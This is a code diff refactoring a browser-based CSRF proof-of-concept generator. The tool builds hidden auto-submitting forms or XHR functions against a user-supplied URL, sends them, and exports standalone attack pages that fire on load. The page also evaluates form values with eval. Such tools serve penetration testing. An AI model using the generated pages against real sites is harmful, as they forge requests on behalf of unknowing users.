@@ -12,8 +12,79 @@
 		<script>
 			var form;
 
+var formfunc={
+	generate : function(){
+		var ezhtml="";
+		var req=getSet();
+		if(req===false)return;
+		ezhtml+='<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="'+ req['enctype'] +'">\n';
+		var params=req['params'];
+		for(var i in params){
+			ezhtml+='<input type="hidden" name="'+escapeHTML(URLdecode(params[i][0]))+'" value="'+escapeHTML(URLdecode(params[i][1]))+'" />\n';
+		}
+		ezhtml+='</form>\n';
+		ezhtml+='<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
+		setEvilHTMLcontent(ezhtml);
+
+		setEvilTextContent(ezhtml);
+		errorMsg("");
+	},
+
+	generateHTML : function(title,bodyhtml){
+		var content=getHTMLheader(title);
+		content+='<body onload="document.evilform.submit();">\n';
+		content+=bodyhtml;
+		content+='\n<p>'+title+'</p>\n';
+		content+='</body>\n';
+		content+=getHTMLfooter();
+		return content;
+	},
+
+	send : function(){
+		var req=getSet();
+		document.getElementById("stat").innerHTML+="<p>Request sent.</p><p>"+escapeHTML(req['url'])+"</p><p>"+escapeHTML(req['params'])+"</p><hr />";
+		var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
+		submit();
+	}
+
+};
+
+var xhrfunc={
+	generate : function(){
+		var req=getSet();
+		if(req===false)return;
+		var ezhtml="";
+		ezhtml+="function csrfXHR(){\n";
+		ezhtml+="var xhr=new XMLHttpRequest();\n";
+		ezhtml+="xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
+		ezhtml+="xhr.setRequestHeader('Content-Type','"+req['enctype']+"');\n";
+		ezhtml+="xhr.send('"+escapeJavascriptCRLF(getParamsRaw())+"');\n";
+		ezhtml+="}\n";
+		setEvilTextContent(ezhtml,true);
+		setEvilHTMLcontent(ezhtml);
+	},
+
+	generateHTML : function(title,bodyhtml){
+		var content=getHTMLheader(title);
+		content+='<body onload="csrfXHR();">\n';
+		content+=bodyhtml;
+		content+='\n<p>'+title+'</p>\n';
+		content+='</body>\n';
+		content+=getHTMLfooter();
+		return content;
+	},
+
+	send : function(){
+		eval(document.getElementById("evilzone").textContent);
+		csrfXHR();
+	}
+};
+
+var func;
+
 window.onload=function(){
 	form=document.forms.messageForm;
+	func=formfunc;
 }
 function URLencode(str){
 	if(typeof str !== 'string') return str;
@@ -63,21 +134,7 @@ function escapeJavascriptCRLF(str){
 
 function errorMsg(msg){
 	if(typeof str === 'string') return msg;
-	document.getElementById("errormsg").innerText=msg;
-}
-
-function generateXHR(isSubmit){
-	var req=getSet();
-	if(req===false)return;
-	var ezhtml="";
-	ezhtml+="function csrfXHR(){\n";
-	ezhtml+="var xhr=new XMLHttpRequest();\n";
-	ezhtml+="xhr.open('" + req['method'] + "','" + req['url'] + "');\n";
-	ezhtml+="xhr.setRequestHeader('Content-Type','"+req['enctype']+"');\n";
-	ezhtml+="xhr.send('"+escapeJavascriptCRLF(getParamsRaw())+"');\n";
-	ezhtml+="}\n";
-	setEvilTextContent(ezhtml,true);
-	setEvilHTMLcontent(ezhtml);
+	document.getElementById("errormsg").textContent=msg;
 }
 
 function setEvilHTMLcontent(ezhtml){
@@ -87,17 +144,16 @@ function setEvilHTMLcontent(ezhtml){
 
 function setEvilTextContent(ezhtml,isScript=false){
 	if(isScript) ezhtml="<"+"script>\n"+ezhtml+"</"+"script>\n";
-	document.getElementById("nowhtml").innerText=ezhtml;
+	document.getElementById("nowhtml").textContent=ezhtml;
+}
+
+function triggerFunc(){
+	var sm=form.sendmethod.value;
+	eval('func='+sm+';');
 }
 
 function generatePoC(){
-	var sm=form.sendmethod.value;
-	if(sm=="form"){
-		generateForm();
-	}
-	else if(sm=="xhr"){
-		generateXHR();
-	}
+	func.generate();
 }
 function getSet(){
 	var url=getURL();
@@ -155,45 +211,11 @@ function getParams(){
 	return dict;
 }
 
-function generateForm(){
-	var ez=document.getElementById("evilzone");
-	var ezhtml="";
-	var req=getSet();
-	if(req===false)return;
-	ezhtml+='<form target="dummyfrm" name="evilform" action="' + req['url'] + '" method="' + req['method'] + '" enctype="'+ req['enctype'] +'">\n';
-	var params=req['params'];
-	for(var i in params){
-		ezhtml+='<input type="hidden" name="'+escapeHTML(URLdecode(params[i][0]))+'" value="'+escapeHTML(URLdecode(params[i][1]))+'" />\n';
-	}
-	ezhtml+='</form>\n';
-	ezhtml+='<iframe src="x" width="1" height="1" name="dummyfrm" style="visibility:hidden"></iframe>';
-	ez.innerHTML=ezhtml;
-
-	document.getElementById("nowhtml").innerText=ezhtml;
-	errorMsg("");
-}
 
 function sendPoC(){
-	var sm=form.sendmethod.value;
-	if(sm=="form"){
-		sendForm();
-	}
-	else if(sm=="xhr"){
-		sendXHR();
-	}
+	func.send();
 }
 
-function sendForm(){
-	var req=getSet();
-	document.getElementById("stat").innerHTML+="<p>Request sent.</p><p>"+escapeHTML(req['url'])+"</p><p>"+escapeHTML(req['params'])+"</p><hr />";
-	var submit = HTMLFormElement.prototype["submit"].bind(document.evilform);
-	submit();
-}
-
-function sendXHR(){
-	eval(document.getElementById("evilzone").innerText);
-	csrfXHR();
-}
 
 function executeDownload(name,content,mimeType){
 	var blob = new Blob([content], {type : mimeType});
@@ -234,44 +256,15 @@ function getHTMLfooter(){
 	return content;
 }
 
-function generateXHRHTML(title,bodyhtml){
-	var content=getHTMLheader(title);
-	content+='<body onload="csrfXHR();">\n';
-	content+=bodyhtml;
-	content+='\n<p>'+title+'</p>\n';
-	content+='</body>\n';
-	content+=getHTMLfooter();
-	return content;
-}
-
-function generateFormHTML(title,bodyhtml){
-	var content=getHTMLheader(title);
-	content+='<body onload="document.evilform.submit();">\n';
-	content+=bodyhtml;
-	content+='\n<p>'+title+'</p>\n';
-	content+='</body>\n';
-	content+=getHTMLfooter();
-	return content;
-}
-
 function downloadHTML(){
 	var nh=document.getElementById("nowhtml");
-	if(nh.innerText==""){
+	if(nh.textContent==""){
 		errorMsg("No downloadable HTML! generate form!");
 		return;
 	}
 	var title=form.title.value;
-	var sm=form.sendmethod.value;
 	var content="";
-	if(sm=="form"){
-		content=generateFormHTML(title,nh.innerText);
-	}
-	else if(sm=="xhr"){
-		content=generateXHRHTML(title,nh.innerText);
-	}else{
-		errorMsg("No downloadable HTML! specify send method!");
-		return;
-	}
+	content=func.generateHTML(title,nh.textContent);
 	var title=document.messageForm.title.value;
 
 	var mimeType='text/plain';
@@ -291,7 +284,9 @@ function downloadHTML(){
 		<span id="errormsg"></span>
 
 		<form name="messageForm">
-			send : <input type="radio" name="sendmethod" id="use form" value="form" checked><label for="use form">Form</label><input type="radio" name="sendmethod" id="use xhr" value="xhr"><label for="use xhr">XHR</label> <br />
+			send :
+			<input type="radio" name="sendmethod" id="use form" value="formfunc" onclick="triggerFunc()" checked><label for="use form">Form</label>
+			<input type="radio" name="sendmethod" id="use xhr" value="xhrfunc" onclick="triggerFunc()"><label for="use xhr">XHR</label> <br />
 			URL:<input type="text" name="url" size="50" /> <br />
 			method: <input type="text" name="method" size="8" value="POST" /><br />
 			enctype: <select name="enctype">
@@ -301,8 +296,8 @@ function downloadHTML(){
 			</select><br />
 			params:<br />
 			<textarea name="params" rows="6" cols="60" ></textarea><br />
-			<button name="postmessage" onclick="generatePoC();sendPoC();return false;" >generate and submit</button>
-			<button name="postmessage" onclick="generatePoC();return false;" >generate only</button><br />
+			<button name="generate" onclick="generatePoC();sendPoC();return false;" >generate and submit</button>
+			<button name="generate" onclick="generatePoC();return false;" >generate only</button><br />
 			title:<input type="text" name="title" size="20" value="CSRF PoC" />
 			<button name="downloadhtml" onclick="generatePoC();downloadHTML();return false;" >download HTML</button>
 		</form>
